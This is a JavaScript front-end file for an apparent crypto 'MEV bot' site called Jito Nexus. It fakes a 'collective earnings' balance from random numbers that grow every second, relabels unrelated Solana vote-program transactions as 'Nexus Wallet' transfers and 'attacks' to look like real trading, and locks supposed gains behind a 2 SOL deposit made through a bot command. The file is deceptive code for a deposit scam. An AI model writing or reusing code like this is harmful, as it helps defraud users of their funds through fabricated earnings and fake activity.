let currentBalance = 0;
let startTime = new Date();
let chart;

const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

document.addEventListener("DOMContentLoaded", function() {
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
    setInterval(fetchRecentTransactions, 30000); // Fetch transactions every 30 seconds
});

function initializeApp() {
    currentBalance = Math.random() * (16000 - 145) + 145;
    startTime = new Date();
    updateTodayStats();
    initializeWallet();
    updateMyGains();
    fetchRecentTransactions();
    initializeStatsGraph();
    showTab('today-stats'); // Show Today's Stats tab by default
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        initializeApp(); // Reset after 24 hours
    } else {
        updateTodayStats();
    }
}

function updateTodayStats() {
    const now = new Date();
    const elapsedSeconds = (now - startTime) / 1000;
    const totalSeconds = 24 * 60 * 60; // 24 hours in seconds
    const progressRatio = elapsedSeconds / totalSeconds;
    
    const maxIncrease = 16000 - currentBalance;
    const increase = maxIncrease * progressRatio * (0.5 + Math.random() * 0.5); // Random factor between 0.5 and 1
    
    currentBalance += increase;

    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraph();
}

function initializeWallet() {
    document.getElementById("wallet-instructions").innerHTML = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
}

function updateMyGains() {
    const gainsContent = document.getElementById("gains-content");
    gainsContent.innerHTML = `
        <span class="lock-icon">🔒</span>
        <p id="gains-message">To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
    `;
}

async function fetchRecentTransactions() {
    try {
        const signatures = await connection.getSignaturesForAddress(new solanaWeb3.PublicKey('Vote111111111111111111111111111111111111111'), { limit: 10 });
        
        const transactions = await Promise.all(signatures.map(async (sig) => {
            const tx = await connection.getTransaction(sig.signature);
            if (!tx) return null;

            const { transaction, meta } = tx;
            const isTransfer = transaction.instructions.some(ix => 
                ix.programId.equals(solanaWeb3.SystemProgram.programId));
            const isSwap = transaction.instructions.some(ix => 
                ix.programId.toBase58() === 'SwaPpA9LAaLfeLi3a68M4DjnLqgtticKg6CnyNwgAC8');

            let type, amount, fromAddress, toAddress;

            if (isTransfer) {
                type = 'transfer';
                amount = meta.postBalances[0] - meta.preBalances[0];
                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
                toAddress = transaction.instructions[0].keys[1].pubkey.toBase58();
            } else if (isSwap) {
                type = 'swap';
                amount = 'Token Swap';
                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
                toAddress = 'N/A';
            } else {
                type = 'other';
                amount = 'Unknown';
                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
                toAddress = 'N/A';
            }

            return {
                type,
                amount: type === 'transfer' ? (Math.abs(amount) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL' : amount,
                time: new Date(tx.blockTime * 1000).toLocaleTimeString(),
                fromAddress: fromAddress.slice(0, 4) + '...' + fromAddress.slice(-4),
                toAddress: toAddress !== 'N/A' ? toAddress.slice(0, 4) + '...' + toAddress.slice(-4) : toAddress
            };
        }));

        displayTransactions(transactions.filter(tx => tx !== null));
    } catch (error) {
        console.error("Error fetching recent transactions:", error);
        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
    }
}

function displayTransactions(transactions) {
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = "";
    transactions.forEach(tx => {
        const txElement = document.createElement("div");
        txElement.className = "transaction";
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Transfer</h3>
                <p>Amount: ${tx.amount} transferred at ${tx.time}</p>
                <p>From: ${tx.fromAddress} To: ${tx.toAddress}</p>
            `;
        } else if (tx.type === 'swap') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Attack</h3>
                <p>Token Swap occurred at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Other Transaction</h3>
                <p>Unknown transaction type at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.classList.remove("active");
    }
    document.getElementById(tabId).classList.add("active");
}

function initializeStatsGraph() {
    const ctx = document.getElementById('stats-graph').getContext('2d');
    chart = new Chart(ctx, {
        type: 'line',
        data: {
            datasets: [{
                label: 'SOL Balance',
                data: [],
                borderColor: 'rgba(0, 255, 255, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            animation: {
                duration: 0
            },
            scales: {
                x: {
                    type: 'time',
                    time: {
                        unit: 'minute',
                        displayFormats: {
                            minute: 'HH:mm'
                        }
                    },
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                },
                y: {
                    beginAtZero: false,
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            },
            plugins: {
                legend: {
                    display: false
                }
            }
        }
    });
}

function updateStatsGraph() {
    const now = new Date();
    chart.data.datasets[0].data.push({x: now, y: currentBalance});
    if (chart.data.datasets[0].data.length > 100) {
        chart.data.datasets[0].data.shift();
    }
    chart.update('none'); // Update without animation for smoother updates
}